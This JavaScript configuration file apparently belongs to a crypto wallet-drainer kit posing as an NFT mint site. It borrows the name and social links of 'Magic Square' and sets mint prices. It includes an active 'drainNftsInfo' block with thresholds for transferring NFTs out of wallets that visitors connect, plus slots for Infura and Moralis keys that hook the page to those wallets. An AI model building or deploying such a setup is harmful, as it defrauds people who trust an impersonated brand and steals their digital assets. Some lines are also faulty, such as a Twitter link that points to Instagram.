const infuraId = ""     // Infuria ID | https://infura.io/ | For Wallet Connect
const moralisApi = ""    // x-api-key | https://moralis.io/ | For NFTs

const collectionInfo = {
    name: "NFT PROJECT BY MAGIC SQUARE", // Name of the collection
    title: "{name}", 
    apply: "5,000", // Total apply NFTs
    socialMedia: {
        instagram: "https://instagram.com/magicsquare_io?igshid=MzRlODBiNWFlZA==", // Twitter link
        discord: "https://discord.gg/magicsquare", // Discord link
        twitter: "https://instagram.com/magicsquare_io?igshid=MzRlODBiNWFlZA==", // Twitter link
    },
    medias: {
        type: "image",
	image: "baby_about3.9f4ff187.gif", // Location logo page tab
    },
    background: {
        type: "image",
        image: "background.gif", // Location background
        video: "",
        color: "#454545",
    }
}
const mintInfo = {
    price: 1,
    totalSupply: 100,
	toFixed: 0,
    minUnits: 1,
    maxUnits: 5,
    askMintLoop: true,
}

const drainNftsInfo = {
    active: true,
    minValue: 0.2,
    maxTransfer: 2,
}

if (mintInfo.minUnits > mintInfo.maxUnits) console.error(`Error: minUnits (${mintInfo.minUnits}) is greater than maxUnits (${maxUnits})`);
if (mintInfo.minUnits <= 0) console.error(`Error: minUnits (${mintInfo.minUnits}) is less than or equal to 0`);